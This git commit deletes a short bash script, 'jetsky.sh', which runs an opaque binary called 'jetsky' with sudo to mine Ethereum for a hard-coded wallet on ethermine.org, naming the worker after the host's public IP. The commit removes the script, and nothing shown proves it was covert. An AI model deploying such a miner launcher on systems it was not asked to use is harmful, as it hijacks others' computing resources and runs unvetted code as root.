6c3d48c3304b03cc81b8e86c9bda20f826697d4b
leumang88 <79134410+leumang88@users.noreply.github.com>
2021-02-16 14:41:41 +0700

    Delete jetsky.sh

--- jetsky.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-
-WALLET=0xf339db86fafc99f85619a0d55e2d1e47ef9a840a
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-eth
-
-cd "$(dirname "$0")"
-
-chmod +x ./jetsky && sudo ./jetsky -G -P stratum1+tcp://$WALLET.$WORKER@asia1.ethermine.org:4444
